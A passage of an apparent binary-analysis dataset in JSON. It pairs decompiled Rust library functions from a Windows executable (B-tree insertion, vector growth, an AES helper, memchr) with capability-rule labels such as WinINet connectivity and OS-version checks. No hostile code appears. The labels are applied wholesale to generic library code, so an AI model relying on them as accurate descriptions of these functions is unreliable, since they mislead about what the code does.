0xe + 0x14;\n        *puVar35 = uStack808;\n        *(puVar35 + 4) = uStack804;\n        *(puVar35 + 1) = uStack800;\n        *(puVar35 + 0xc) = uStack796;\n        puVar35 = puVar40 + uVar37 * 0xe + 0x12;\n        *puVar35 = uStack824;\n        *(puVar35 + 4) = uStack820;\n        *(puVar35 + 1) = uStack816;\n        *(puVar35 + 0xc) = uStack812;\n        puVar35 = puVar40 + uVar37 * 0xe + 0x10;\n        *puVar35 = uStack840;\n        *(puVar35 + 4) = uStack836;\n        *(puVar35 + 1) = uStack832;\n        *(puVar35 + 0xc) = uStack828;\n        puVar35 = puVar40 + uVar37 * 0xe + 0xe;\n        *puVar35 = uStack856;\n        *(puVar35 + 4) = uStack852;\n        *(puVar35 + 1) = uStack848;\n        *(puVar35 + 0xc) = uStack844;\n        puVar35 = puVar40 + uVar37 * 0xe + 0xc;\n        *puVar35 = uStack872;\n        *(puVar35 + 4) = uStack868;\n        *(puVar35 + 1) = uStack864;\n        *(puVar35 + 0xc) = uStack860;\n        *(puVar40 + 0x532) = uVar4 + 1;\n        if (iVar31 != 2) {\n            if (*unaff_RSI == NULL) {\n                iStack720 = 0;\n            }\n            else {\n                iStack720 = 0;\n                puVar40 = *unaff_RSI;\n                uVar36 = uVar41;\n                puVar35 = puVar32;\n                do {\n                    puVar33 = puVar40;\n                    uVar4 = *(unaff_RSI + 0xa6);\n                    uStack912 = uVar4;\n                    uVar5 = *(puVar33 + 0x532);\n                    uVar42 = uVar5;\n                    uStack712 = uVar44;\n                    uStack708 = uVar44 >> 0x20;\n                    uStack704 = iVar31;\n                    uStack700 = iVar31 >> 0x20;\n                    if (uVar42 < 0xb) {\n                        uVar34 = uStack912 + 1;\n                        if (uVar4 < uVar5) {\n                            sub.msvcrt.dll_memmove(puVar33 + uStack912 + 2, puVar33 + uStack912 + 1);\n                            puVar33[uStack912 + 1] = uVar36;\n                            sub.msvcrt.dll_memmove\n                                      (puVar33 + uVar34 * 0xe + 0xc, puVar33 + uStack912 * 0xe + 0xc, \n                                       (uVar42 - uStack912) * 0x70);\n                            puVar32 = puVar33 + uStack912 * 0xe + 0xc;\n                            *puVar32 = uStack712;\n                            *(puVar32 + 4) = uStack708;\n                            *(puVar32 + 1) = uStack704;\n                            *(puVar32 + 0xc) = uStack700;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0xe;\n                            *puVar32 = uStack488;\n                            *(puVar32 + 4) = uStack484;\n                            *(puVar32 + 1) = uStack384;\n                            *(puVar32 + 0xc) = uStack380;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x10;\n                            *puVar32 = uStack376;\n                            *(puVar32 + 4) = uStack372;\n                            *(puVar32 + 1) = uStack368;\n                            *(puVar32 + 0xc) = uStack364;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x12;\n                            *puVar32 = uStack360;\n                            *(puVar32 + 4) = uStack356;\n                            *(puVar32 + 1) = uStack352;\n                            *(puVar32 + 0xc) = uStack348;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x14;\n                            *puVar32 = uStack344;\n                            *(puVar32 + 4) = uStack340;\n                            *(puVar32 + 1) = uStack336;\n                            *(puVar32 + 0xc) = uStack332;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x16;\n                            *puVar32 = uStack328;\n                            *(puVar32 + 4) = uStack324;\n                            *(puVar32 + 1) = uStack320;\n                            *(puVar32 + 0xc) = uStack316;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x18;\n                            *puVar32 = uStack312;\n                            *(puVar32 + 4) = uStack308;\n                            *(puVar32 + 1) = uStack304;\n                            *(puVar32 + 0xc) = uStack300;\n                            sub.msvcrt.dll_memmove\n                                      (puVar33 + uStack912 + 0xa9, puVar33 + uStack912 + 0xa8, (uVar42 - uStack912) * 8)\n                            ;\n                        }\n                        else {\n                            puVar33[uStack912 + 1] = uVar36;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x18;\n                            *puVar32 = uStack312;\n                            *(puVar32 + 4) = uStack308;\n                            *(puVar32 + 1) = uStack304;\n                            *(puVar32 + 0xc) = uStack300;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x16;\n                            *puVar32 = uStack328;\n                            *(puVar32 + 4) = uStack324;\n                            *(puVar32 + 1) = uStack320;\n                            *(puVar32 + 0xc) = uStack316;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x14;\n                            *puVar32 = uStack344;\n                            *(puVar32 + 4) = uStack340;\n                            *(puVar32 + 1) = uStack336;\n                            *(puVar32 + 0xc) = uStack332;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x12;\n                            *puVar32 = uStack360;\n                            *(puVar32 + 4) = uStack356;\n                            *(puVar32 + 1) = uStack352;\n                            *(puVar32 + 0xc) = uStack348;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0x10;\n                            *puVar32 = uStack376;\n                            *(puVar32 + 4) = uStack372;\n                            *(puVar32 + 1) = uStack368;\n                            *(puVar32 + 0xc) = uStack364;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0xe;\n                            *puVar32 = uStack488;\n                            *(puVar32 + 4) = uStack484;\n                            *(puVar32 + 1) = uStack384;\n                            *(puVar32 + 0xc) = uStack380;\n                            puVar32 = puVar33 + uStack912 * 0xe + 0xc;\n                            *puVar32 = uStack712;\n                            *(puVar32 + 4) = uStack708;\n                            *(puVar32 + 1) = uStack704;\n                            *(puVar32 + 0xc) = uStack700;\n                        }\n                        puVar33[uStack912 + 0xa8] = puVar35;\n                        *(puVar33 + 0x532) = uVar5 + 1;\n                        if (uVar34 < uVar42 + 2) {\n                            uVar30 = (uVar5 - uVar4) + 1;\n                            if ((uVar30 & 3) != 0) {\n                                uVar45 = 0;\n                                do {\n                                    puVar32 = puVar33[uVar34 + uVar45 + 0xa7];\n                                    *puVar32 = puVar33;\n                                    *(puVar32 + 0xa6) = uVar34 + uVar45;\n                                    uVar45 = uVar45 + 1;\n                                } while ((uVar30 & 3) != uVar45);\n                                uVar34 = uVar34 + uVar45;\n                            }\n                            if (2 < uVar42 - uStack912) {\n                                do {\n                                    puVar32 = puVar33[uVar34 + 0xa7];\n                                    *puVar32 = puVar33;\n                                    iVar38 = uVar34;\n                                    *(puVar32 + 0xa6) = iVar38;\n                                    puVar32 = puVar33[uVar34 + 0xa8];\n                                    *puVar32 = puVar33;\n                                    *(puVar32 + 0xa6) = iVar38 + 1;\n                                    puVar32 = puVar33[uVar34 + 0xa9];\n                                    *puVar32 = puVar33;\n                                    *(puVar32 + 0xa6) = iVar38 + 2;\n                                    puVar32 = puVar33[uVar34 + 0xaa];\n                                    *puVar32 = puVar33;\n                                    *(puVar32 + 0xa6) = iVar38 + 3;\n                                    uVar34 = uVar34 + 4;\n                                } while (uVar34 != uVar42 + 2);\n                            }\n                        }\n                        goto code_r0x0040d258;\n                    }\n                    if (uVar4 < 5) {\n                        bVar46 = true;\n                        uVar34 = 4;\n                    }\n                    else if (uVar4 == 5) {\n                        bVar46 = true;\n                        uVar34 = uStack912;\n                    }\n                    else if (uVar4 == 6) {\n                        bVar46 = false;\n                        uStack912 = 0;\n                        uVar34 = 5;\n                    }\n                    else {\n                        uStack912 = uStack912 - 7;\n                        bVar46 = false;\n                        uVar34 = 6;\n                    }\n                    puVar32 = sym.__rust_alloc(0x598, 8);\n                    if (puVar32 == NULL) {\n                        dbg.handle_alloc_error(0x598);\n                        goto code_r0x0040d5b6;\n                    }\n                    *puVar32 = 0;\n                    uVar4 = *(puVar33 + 0x532);\n                    uVar45 = ~uVar34 + uVar4;\n                    *(puVar32 + 0x532) = uVar45;\n                    uVar41 = puVar33[uVar34 + 1];\n                    puVar40 = puVar33 + uVar34 * 0xe + 0x18;\n                    uVar18 = *puVar40;\n                    uVar19 = *(puVar40 + 4);\n                    uVar20 = *(puVar40 + 1);\n                    uVar21 = *(puVar40 + 0xc);\n                    puVar40 = puVar33 + uVar34 * 0xe + 0x16;\n                    uVar22 = *puVar40;\n                    uVar23 = *(puVar40 + 4);\n                    uVar24 = *(puVar40 + 1);\n                    uVar25 = *(puVar40 + 0xc);\n                    puVar40 = puVar33 + uVar34 * 0xe + 0x14;\n                    uVar26 = *puVar40;\n                    uVar27 = *(puVar40 + 4);\n                    uVar28 = *(puVar40 + 1);\n                    uVar29 = *(puVar40 + 0xc);\n                    uVar44 = puVar33[uVar34 * 0xe + 0xc];\n                    iVar31 = (puVar33 + uVar34 * 0xe + 0xc)[1];\n                    puVar40 = puVar33 + uVar34 * 0xe + 0xe;\n                    uVar6 = *puVar40;\n                    uVar7 = *(puVar40 + 4);\n                    uVar8 = *(puVar40 + 1);\n                    uVar9 = *(puVar40 + 0xc);\n                    puVar40 = puVar33 + uVar34 * 0xe + 0x10;\n                    uVar10 = *puVar40;\n                    uVar11 = *(puVar40 + 4);\n                    uVar12 = *(puVar40 + 1);\n                    uVar13 = *(puVar40 + 0xc);\n                    puVar40 = puVar33 + uVar34 * 0xe + 0x12;\n                    uVar14 = *puVar40;\n                    uVar15 = *(puVar40 + 4);\n                    uVar16 = *(puVar40 + 1);\n                    uVar17 = *(puVar40 + 0xc);\n                    if (0xb < uVar45) {\n                        dbg.slice_end_index_len_fail(uVar45, 0xb);\n                        goto code_r0x0040d5b6;\n                    }\n                    if (uVar4 - (uVar34 + 1) != uVar45) {\n                        dbg.panic(str.assertion_failed:_src.len____dst.len__, 0x28, \n                                  str.assertion_failed:_src.len____dst.len__ + 0x28);\n                        goto code_r0x0040d5b6;\n                    }\n                    sym.memcpy(puVar32 + 1, puVar33 + uVar34 + 2, uVar45 * 8);\n                    sym.memcpy(puVar32 + 0xc, puVar33 + (uVar34 + 1) * 0xe + 0xc, uVar45 * 0x70);\n                    *(puVar33 + 0x532) = uVar34;\n                    uVar45 = *(puVar32 + 0x532);\n                    if (0xb < uVar45) {\n                        dbg.slice_end_index_len_fail(uVar45 + 1, 0xc);\n                        goto code_r0x0040d5b6;\n                    }\n                    if (uVar42 - uVar34 != uVar45 + 1) {\n                        dbg.panic(str.assertion_failed:_src.len____dst.len__, 0x28, \n                                  str.assertion_failed:_src.len____dst.len__ + 0x28);\n                        goto code_r0x0040d5b6;\n                    }\n                    iStack720 = iStack720 + 1;\n                    sym.memcpy(puVar32 + 0xa7, puVar33 + uVar34 + 0xa8, (uVar42 - uVar34) * 8);\n                    uVar42 = 0;\n                    do {\n                        uVar34 = uVar42 + (uVar42 < uVar45);\n                        puVar40 = puVar32[uVar42 + 0xa7];\n                        *puVar40 = puVar32;\n                        *(puVar40 + 0xa6) = uVar42;\n                        if (uVar45 <= uVar42) break;\n                        uVar42 = uVar34;\n                    } while (uVar34 <= uVar45);\n                    puVar40 = puVar32;\n                    if (bVar46) {\n                        puVar40 = puVar33;\n                    }\n                    uVar4 = *(puVar40 + 0x532);\n                    uVar34 = uVar4;\n                    uVar42 = uStack912 + 1;\n                    if (uVar34 < uVar42) {\n                        puVar40[uStack912 + 1] = uVar36;\n                    }\n                    else {\n                        sub.msvcrt.dll_memmove\n                                  (puVar40 + uStack912 + 2, puVar40 + uStack912 + 1, (uVar34 - uStack912) * 8);\n                        puVar40[uStack912 + 1] = uVar36;\n                        sub.msvcrt.dll_memmove\n                                  (puVar40 + uVar42 * 0xe + 0xc, puVar40 + uStack912 * 0xe + 0xc, \n                                   (uVar34 - uStack912) * 0x70);\n                    }\n                    puVar3 = puVar40 + uStack912 * 0xe + 0x18;\n                    *puVar3 = uStack312;\n                    *(puVar3 + 4) = uStack308;\n                    *(puVar3 + 1) = uStack304;\n                    *(puVar3 + 0xc) = uStack300;\n                    puVar3 = puVar40 + uStack912 * 0xe + 0x16;\n                    *puVar3 = uStack328;\n                    *(puVar3 + 4) = uStack324;\n                    *(puVar3 + 1) = uStack320;\n                    *(puVar3 + 0xc) = uStack316;\n                    puVar3 = puVar40 + uStack912 * 0xe + 0x14;\n                    *puVar3 = uStack344;\n                    *(puVar3 + 4) = uStack340;\n                    *(puVar3 + 1) = uStack336;\n                    *(puVar3 + 0xc) = uStack332;\n                    puVar3 = puVar40 + uStack912 * 0xe + 0x12;\n                    *puVar3 = uStack360;\n                    *(puVar3 + 4) = uStack356;\n                    *(puVar3 + 1) = uStack352;\n                    *(puVar3 + 0xc) = uStack348;\n                    puVar3 = puVar40 + uStack912 * 0xe + 0x10;\n                    *puVar3 = uStack376;\n                    *(puVar3 + 4) = uStack372;\n                    *(puVar3 + 1) = uStack368;\n                    *(puVar3 + 0xc) = uStack364;\n                    puVar3 = puVar40 + uStack912 * 0xe + 0xe;\n                    *puVar3 = uStack488;\n                    *(puVar3 + 4) = uStack484;\n                    *(puVar3 + 1) = uStack384;\n                    *(puVar3 + 0xc) = uStack380;\n                    puVar3 = puVar40 + uStack912 * 0xe + 0xc;\n                    *puVar3 = uStack712;\n                    *(puVar3 + 4) = uStack708;\n                    *(puVar3 + 1) = uStack704;\n                    *(puVar3 + 0xc) = uStack700;\n                    uVar45 = uVar34 + 2;\n                    if (uStack912 + 2 < uVar45) {\n                        sub.msvcrt.dll_memmove\n                                  (puVar40 + uStack912 + 0xa9, puVar40 + uStack912 + 0xa8, (uVar34 - uStack912) * 8);\n                    }\n                    puVar40[uStack912 + 0xa8] = puVar35;\n                    *(puVar40 + 0x532) = uVar4 + 1;\n                    if (uVar42 < uVar45) {\n                        uVar30 = (uVar4 - uStack912) + 1;\n                        if ((uVar30 & 3) != 0) {\n                            uVar37 = 0;\n                            do {\n                                puVar35 = puVar40[uStack912 + uVar37 + 0xa8];\n                                *puVar35 = puVar40;\n                                *(puVar35 + 0xa6) = uVar42 + uVar37;\n                                uVar37 = uVar37 + 1;\n                            } while ((uVar30 & 3) != uVar37);\n                            uVar42 = uVar42 + uVar37;\n                        }\n                        if (2 < uVar34 - uStack912) {\n                            do {\n                                puVar35 = puVar40[uVar42 + 0xa7];\n                                *puVar35 = puVar40;\n                                iVar38 = uVar42;\n                                *(puVar35 + 0xa6) = iVar38;\n                                puVar35 = puVar40[uVar42 + 0xa8];\n                                *puVar35 = puVar40;\n                                *(puVar35 + 0xa6) = iVar38 + 1;\n                                puVar35 = puVar40[uVar42 + 0xa9];\n                                *puVar35 = puVar40;\n                                *(puVar35 + 0xa6) = iVar38 + 2;\n                                puVar35 = puVar40[uVar42 + 0xaa];\n                                *puVar35 = puVar40;\n                                *(puVar35 + 0xa6) = iVar38 + 3;\n                                uVar42 = uVar42 + 4;\n                            } while (uVar42 != uVar45);\n                        }\n                    }\n                    if (iVar31 == 2) goto code_r0x0040d258;\n                    puVar40 = *puVar33;\n                    uVar36 = uVar41;\n                    unaff_RSI = puVar33;\n                    puVar35 = puVar32;\n                    uStack384 = uVar8;\n                    uStack380 = uVar9;\n                    uStack376 = uVar10;\n                    uStack372 = uVar11;\n                    uStack368 = uVar12;\n                    uStack364 = uVar13;\n                    uStack360 = uVar14;\n                    uStack356 = uVar15;\n                    uStack352 = uVar16;\n                    uStack348 = uVar17;\n                    uStack344 = uVar26;\n                    uStack340 = uVar27;\n                    uStack336 = uVar28;\n                    uStack332 = uVar29;\n                    uStack328 = uVar22;\n                    uStack324 = uVar23;\n                    uStack320 = uVar24;\n                    uStack316 = uVar25;\n                    uStack312 = uVar18;\n                    uStack308 = uVar19;\n                    uStack304 = uVar20;\n                    uStack300 = uVar21;\n                    uStack488 = uVar6;\n                    uStack484 = uVar7;\n                } while (*puVar33 != NULL);\n            }\n            puVar40 = arg1[4];\n            if (puVar40 == NULL) {\n                dbg.panic(0x44bcbb, 0x2b, 0x445c90);\n                goto code_r0x0040d5b6;\n            }\n            iVar43 = arg1[3];\n            puVar35 = sym.__rust_alloc(0x598, 8);\n            if (puVar35 == NULL) {\n                dbg.handle_alloc_error(0x598);\n                goto code_r0x0040d5b6;\n            }\n            *puVar35 = 0;\n            *(puVar35 + 0x532) = 0;\n            puVar35[0xa7] = puVar40;\n            *puVar40 = puVar35;\n            *(puVar40 + 0xa6) = 0;\n            arg1[3] = iVar43 + 1;\n            arg1[4] = puVar35;\n            uStack848 = uVar44;\n            uStack844 = uVar44 >> 0x20;\n            uStack840 = iVar31;\n            uStack836 = iVar31 >> 0x20;\n            if (iVar43 != iStack720) {\n                dbg.panic(\"assertion failed: edge.height == self.height - 1\", 0x30, 0x445d58);\n                goto code_r0x0040d5b6;\n            }\n            uVar4 = *(puVar35 + 0x532);\n            uVar42 = uVar4;\n            if (10 < uVar42) {\n                dbg.panic(\"assertion failed: idx < CAPACITY/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\alloc\\\\src\\\\collections\\\\btree\\\\node.rsassertion failed: edge.height == self.height - 1\"\n                          , 0x20, 0x445d70);\n                goto code_r0x0040d5b6;\n            }\n            *(puVar35 + 0x532) = uVar4 + 1;\n            puVar35[uVar42 + 1] = uVar41;\n            puVar40 = puVar35 + uVar42 * 0xe + 0x18;\n            *puVar40 = uStack312;\n            *(puVar40 + 4) = uStack308;\n            *(puVar40 + 1) = uStack304;\n            *(puVar40 + 0xc) = uStack300;\n            puVar40 = puVar35 + uVar42 * 0xe + 0x16;\n            *puVar40 = uStack328;\n            *(puVar40 + 4) = uStack324;\n            *(puVar40 + 1) = uStack320;\n            *(puVar40 + 0xc) = uStack316;\n            puVar40 = puVar35 + uVar42 * 0xe + 0x14;\n            *puVar40 = uStack344;\n            *(puVar40 + 4) = uStack340;\n            *(puVar40 + 1) = uStack336;\n            *(puVar40 + 0xc) = uStack332;\n            puVar40 = puVar35 + uVar42 * 0xe + 0x12;\n            *puVar40 = uStack360;\n            *(puVar40 + 4) = uStack356;\n            *(puVar40 + 1) = uStack352;\n            *(puVar40 + 0xc) = uStack348;\n            puVar40 = puVar35 + uVar42 * 0xe + 0x10;\n            *puVar40 = uStack376;\n            *(puVar40 + 4) = uStack372;\n            *(puVar40 + 1) = uStack368;\n            *(puVar40 + 0xc) = uStack364;\n            puVar40 = puVar35 + uVar42 * 0xe + 0xe;\n            *puVar40 = uStack488;\n            *(puVar40 + 4) = uStack484;\n            *(puVar40 + 1) = uStack384;\n            *(puVar40 + 0xc) = uStack380;\n            puVar40 = puVar35 + uVar42 * 0xe + 0xc;\n            *puVar40 = uStack848;\n            *(puVar40 + 4) = uStack844;\n            *(puVar40 + 1) = uStack840;\n            *(puVar40 + 0xc) = uStack836;\n            puVar35[uVar42 + 0xa8] = puVar32;\n            *puVar32 = puVar35;\n            *(puVar32 + 0xa6) = uVar4 + 1;\n        }\ncode_r0x0040d258:\n        arg1[5] = arg1[5] + 1;\n    }\ncode_r0x0040c28e:\n    uVar42 = 0;\ncode_r0x0040c290:\n    return uVar42 & 0xffffffff;\n}\n",
        "token_count": 12919
    },
    "5de88aeb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::h5de88aeb0ab60f00(ulong *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    ulong uStack40;\n    int64_t iStack32;\n    ulong uStack24;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::h5de88aeb0ab60f00\n    uVar2 = arg2 + 1;\n    if (uVar2 != 0) {\n        iVar1 = arg1[1];\n        if (uVar2 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (iVar1 == 0) {\n            uStack24 = 0;\n        }\n        else {\n            iStack32 = iVar1 * 0x70;\n            uStack40 = *arg1;\n            uStack24 = 8;\n        }\n        sym.alloc::raw_vec::finish_grow::h1cb8de98d7265dba\n                  (&iStack64, SUB168(ZEXT816(uVar3) * ZEXT816(0x70), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x70) >> 0x40, 0) == 0) << 3, &uStack40);\n        if (iStack64 == 0) {\n            *arg1 = uStack56;\n            arg1[1] = uVar3;\n            return;\n        }\n        if (iStack48 != 0) {\n            dbg.handle_alloc_error(uStack56);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 479
    },
    "1cb8de98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::finish_grow::h1cb8de98d7265dba(ulong *arg1, int64_t arg2, int64_t arg3, ulong *arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    // alloc::raw_vec::finish_grow::h1cb8de98d7265dba\n    if (arg3 == 0) {\n        arg1[1] = arg2;\n        uVar2 = 1;\n        arg3 = 0;\n        goto code_r0x0040d82e;\n    }\n    if ((arg4[2] == 0) || (arg4[1] == 0)) {\n        if (arg2 != 0) {\n            iVar1 = sym.__rust_alloc(arg2, arg3);\n            goto joined_r0x0040d819;\n        }\n        iVar1 = arg3;\n        if (arg3 != 0) goto code_r0x0040d81b;\n    }\n    else {\n        iVar1 = sym.__rust_realloc(*arg4, arg4[1], arg3, arg2);\njoined_r0x0040d819:\n        if (iVar1 != 0) {\ncode_r0x0040d81b:\n            arg1[1] = iVar1;\n            uVar2 = 0;\n            arg3 = arg2;\n            goto code_r0x0040d82e;\n        }\n    }\n    arg1[1] = arg2;\n    uVar2 = 1;\ncode_r0x0040d82e:\n    arg1[2] = arg3;\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 369
    },
    "f5621314": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hf5621314c30bb69b(ulong *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    int64_t iStack64;\n    ulong uStack56;\n    int64_t iStack48;\n    ulong uStack40;\n    int64_t iStack32;\n    ulong uStack24;\n    \n    // alloc::raw_vec::RawVec<T,A>::reserve_for_push::hf5621314c30bb69b\n    uVar2 = arg2 + 1;\n    if (uVar2 != 0) {\n        iVar1 = arg1[1];\n        if (uVar2 < iVar1 * 2) {\n            uVar2 = iVar1 * 2;\n        }\n        uVar3 = 4;\n        if (4 < uVar2) {\n            uVar3 = uVar2;\n        }\n        if (iVar1 == 0) {\n            uStack24 = 0;\n        }\n        else {\n            iStack32 = iVar1 * 0x10;\n            uStack40 = *arg1;\n            uStack24 = 8;\n        }\n        sym.alloc::raw_vec::finish_grow::h1cb8de98d7265dba\n                  (&iStack64, SUB168(ZEXT816(uVar3) * ZEXT816(0x10), 0), \n                   (SUB168(ZEXT816(uVar3) * ZEXT816(0x10) >> 0x40, 0) == 0) << 3, &uStack40);\n        if (iStack64 == 0) {\n            *arg1 = uStack56;\n            arg1[1] = uVar3;\n            return;\n        }\n        if (iStack48 != 0) {\n            dbg.handle_alloc_error(uStack56);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    sym.alloc::raw_vec::capacity_overflow::hf906fa3dbddee2ea();\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 475
    },
    "3a59bec7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * sym._gimli::read::abbrev::Attributes_as_core::ops::deref::Deref_::deref::h3a59bec7b942654d(int64_t *arg1)\n\n{\n    // <gimli::read::abbrev::Attributes as core::ops::deref::Deref>::deref::h3a59bec7b942654d\n    if (*arg1 == 0) {\n        if (5 < arg1[0xb]) {\n            dbg.slice_end_index_len_fail(arg1[0xb], 5);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        arg1 = arg1 + 1;\n    }\n    else {\n        arg1 = arg1[1];\n    }\n    return arg1;\n}\n",
        "token_count": 172
    },
    "f777b088": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.alloc::raw_vec::finish_grow::hf777b0884249325f(ulong *arg1, int64_t arg2, int64_t arg3, ulong *arg4)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    // alloc::raw_vec::finish_grow::hf777b0884249325f\n    if (arg3 == 0) {\n        arg1[1] = arg2;\n        uVar2 = 1;\n        arg3 = 0;\n    }\n    else {\n        if ((arg4[2] == 0) || (arg4[1] == 0)) {\n            iVar3 = arg3;\n            iVar1 = sym._ZN5alloc5alloc6Global10alloc_impl17hd38d3c93a0ea2d69E.149(arg2, arg3);\n        }\n        else {\n            iVar1 = sym.__rust_realloc(*arg4, arg4[1], arg3, arg2);\n            iVar3 = arg2;\n        }\n        if (iVar1 == 0) {\n            arg1[1] = arg2;\n            uVar2 = 1;\n        }\n        else {\n            arg1[1] = iVar1;\n            uVar2 = 0;\n            arg3 = iVar3;\n        }\n    }\n    arg1[2] = arg3;\n    *arg1 = uVar2;\n    return;\n}\n",
        "token_count": 317
    },
    "0cc37895": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t sym.libaes::get_u32::h0cc37895dca67686(uint32_t *arg1, uint64_t arg2)\n\n{\n    uint32_t uVar1;\n    ulong arg1_00;\n    ulong arg2_00;\n    ulong arg3;\n    \n    // libaes::get_u32::h0cc37895dca67686\n    if (arg2 == 0) {\n        arg3 = 0x446018;\n        arg1_00 = 0;\n        arg2_00 = 0;\n    }\n    else if (arg2 == 1) {\n        arg3 = 0x446030;\n        arg1_00 = 1;\n        arg2_00 = 1;\n    }\n    else if (arg2 < 3) {\n        arg3 = 0x446048;\n        arg1_00 = 2;\n        arg2_00 = 2;\n    }\n    else {\n        if (arg2 != 3) {\n            uVar1 = *arg1;\n            return uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;\n        }\n        arg3 = 0x446060;\n        arg1_00 = 3;\n        arg2_00 = 3;\n    }\n    dbg.panic_bounds_check(arg1_00, arg2_00, arg3);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 341
    },
    "916a6044": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong sym.memchr::memchr::x86::sse2::memchr::h916a6044a84b6269(char *arg1, uint64_t arg2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int16_t iVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    int64_t iVar8;\n    char *pcVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint8_t uVar12;\n    uchar auVar13 [16];\n    \n    // memchr::memchr::x86::sse2::memchr::h916a6044a84b6269\n    uVar11 = 0x40;\n    if (arg2 < 0x40) {\n        uVar11 = arg2;\n    }\n    pcVar1 = arg1 + arg2;\n    if (arg2 < 0x10) {\n        iVar10 = 0;\n        while (arg1[iVar10] != '\\0') {\n            iVar8 = iVar10 + 1;\n            iVar10 = iVar10 + 1;\n            if (pcVar1 <= arg1 + iVar8) {\n                return 0;\n            }\n        }\n    }\n    else {\n        auVar13 = CONCAT115(-(arg1[0xf] == '\\0'), \n                            CONCAT114(-(arg1[0xe] == '\\0'), \n                                      CONCAT113(-(arg1[0xd] == '\\0'), \n                                                CONCAT112(-(arg1[0xc] == '\\0'), \n                                                          CONCAT111(-(arg1[0xb] == '\\0'), \n                                                                    CONCAT110(-(arg1[10] == '\\0'), \n                                                                              CONCAT19(-(arg1[9] == '\\0'), \n                                                                                       CONCAT18(-(arg1[8] == '\\0'), \n                                                                                                CONCAT17(-(arg1[7] ==\n                                                                                                          '\\0'), \n                                                            CONCAT16(-(arg1[6] == '\\0'), \n                                                                     CONCAT15(-(arg1[5] == '\\0'), \n                                                                              CONCAT14(-(arg1[4] == '\\0'), \n                                                                                       CONCAT13(-(arg1[3] == '\\0'), \n                                                                                                CONCAT12(-(arg1[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(arg1[1] == '\\0'), -(*arg1 == '\\0'))))))))))))))))\n        ;\n        uVar7 = SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 